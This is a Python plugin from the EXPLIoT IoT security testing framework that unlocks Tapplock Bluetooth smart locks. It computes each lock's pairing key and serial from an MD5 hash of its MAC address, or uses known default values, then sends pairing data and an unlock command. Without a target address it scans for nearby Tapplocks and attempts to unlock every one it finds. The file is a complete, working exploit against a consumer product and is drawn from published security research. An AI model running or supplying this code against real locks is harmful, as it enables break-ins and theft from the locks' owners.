#
#
# expliot - Internet Of Things Security Testing and Exploitation Framework
# 
# Copyright (C) 2018  Aseem Jakhar
#
# Email:   aseemjakhar@gmail.com
# Twitter: @aseemjakhar
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
# BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
# PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
# OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#

from expliot.core.tests.test import *
from expliot.core.protocols.radio.ble import Ble, BlePeripheral
from hashlib import md5

class TappUnlock(Test):
    TNAMEPREFIX = "TL104A"
    #PAIRPREXIX  = "55AAB4010800"
    PAIRPREXIX = "55aab4010800"
    UNLOCKCMD   = "55aa810200008201"
    UNLOCKHNDL  = 0xe
    DEFKEY = "01020304"
    DEFSERIAL = "00000000"
    DEFPAIR = PAIRPREXIX + DEFKEY + DEFSERIAL

    def __init__(self):

        super().__init__(name     = "Tapplock unlock",
                         summary  = "Unlock BLE Tapplocks in close proximity",
                         descr    = """This plugin allows you to unlock the Tapplocks in close (BLE) proximity.
                                    It was made possible by @cybergibbons research on the same and he was 
                                    kind enough to share his code. NOTE: This plugin needs root privileges.  
                                    You may run it as $ sudo efconsole. Thanks to @slawekja for providing the default
                                    key1 (01020304) and serial (00000000) values for earlier version of Tapplock""",
                         author   = "Aseem Jakhar (Original code provided by @cybergibbons)",
                         email    = "aseemjakhar@gmail.com",
                         ref      = ["https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/"],
                         category = TCategory(TCategory.BLE, TCategory.RD, TCategory.EXPLOIT),
                         target   = TTarget("Tapplock", "1.0", "Tapplock"),
                         needroot = True)

        self.argparser.add_argument("-i", "--iface", default=0, type=int,
                                    help="""HCI interface no. to use for scanning. 0 = hci0, 1 = hci1 and so 
                                            on. Default is 0""")
        self.argparser.add_argument("-a", "--addr",
                                    help="""BLE Address of specific Tapplock that you want to unlock. If not 
                                            specified, it will scan and attempt to unlock all the Tapplocks found""")
        self.argparser.add_argument("-d", "--default", action="store_true", default=False,
                                    help="""Use default key1 (01020304) and Serial (00000000) instead of generating 
                                            them from the BLE address""")
        self.argparser.add_argument("-t", "--timeout", default=2, type=int,
                                    help="Scan timeout. Default is 2 seconds")


    def execute(self):
        try:
            if self.args.addr:
                TLog.generic("Tapplock BLE Address specified ({})".format(self.args.addr))
                self.unlock(self.args.addr)
            else:
                TLog.generic("Scanning for Tapplocks")
                devs = Ble.scan(iface=self.args.iface, tout=self.args.timeout)
                for d in devs:
                    name = d.getValueText(Ble.ADTYPE_NAME)
                    if name is not None and name[0:6] == self.TNAMEPREFIX:
                        TLog.success("Found Tapplock (name={})(mac={})".format(name, d.addr))
                        self.unlock(d.addr)
        except:
            self.result.exception()

    def unlock(self, mac):
        """
        Unlock the specified Tapplock

        :param mac: BLE address of the Tapplock
        :return:
        """
        p = BlePeripheral()
        try:
            TLog.trydo("Unlocking Tapplock ({})".format(mac))
            # Get key1 and serial
            pdata = None
            if self.args.default is False:
                rmac = ":".join(mac.upper().split(":")[::-1])
                hash = md5(rmac.encode()).hexdigest()
                key1 = hash[0:8]
                serial = hash[16:24]
                TLog.generic("(Calculated hash={})(key1={})(serial={})".format(hash, key1, serial))
                pdata = self.PAIRPREXIX + key1 + serial
            else:
                TLog.generic("(default key1={})(default serial={})".format(self.DEFKEY, self.DEFSERIAL))
                pdata = self.DEFPAIR
            # Calculate the checksum
            chksum = 0
            for byte in bytes.fromhex(pdata):
                chksum = chksum + (byte % 255)
            chksumstr = "{:04x}".format(chksum)
            # Create the Pairing data
            pdata = pdata + chksumstr[2:4] + chksumstr[0:2]
            p.connect(mac, addrType=Ble.ADDR_TYPE_RANDOM)
            TLog.trydo("Sending pair data({})".format(pdata))
            p.writeCharacteristic(self.UNLOCKHNDL, bytes.fromhex(pdata))
            TLog.trydo("Sending unlock command({})".format(self.UNLOCKCMD))
            p.writeCharacteristic(self.UNLOCKHNDL, bytes.fromhex(self.UNLOCKCMD))
        finally:
            p.disconnect()
